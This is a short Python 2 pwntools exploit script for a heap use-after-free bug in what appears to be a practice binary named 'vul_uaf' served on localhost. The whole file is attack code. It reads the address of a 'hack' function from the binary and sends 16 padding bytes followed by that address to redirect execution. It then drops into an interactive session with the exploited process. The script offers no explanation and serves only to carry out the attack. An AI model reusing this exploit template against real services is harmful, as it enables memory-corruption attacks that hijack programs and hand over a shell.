

#! /usr/bin/python
#coding:utf-8
'''Heap_UseAfterFree'''

import sys
sys.path.append("..")
from pwn import *

class exploit(object):
    'exploit7'
    def __init__(self):
        self.options = {'dIP' :'127.0.0.1',
                'port' :'11111'}
        self.info = {
            'sysbinsh':0x0
            }
    def test(self):
        ip, port = self.options['dIP'], int(self.options['port'])
        p = remote(ip, port)

        libc = ELF('./vul_uaf')
        self.info['sysbinsh'] = libc.symbols['hack'] 

        print hex(self.info['sysbinsh'])
        
        payload = '1' * 16 + p64(self.info['sysbinsh'])
        p.sendline(payload)
        #print p.recv(8)
        a=raw_input('debug:')
        
        p.interactive()





if __name__=='__main__':
    exp=exploit()
    exp.test()

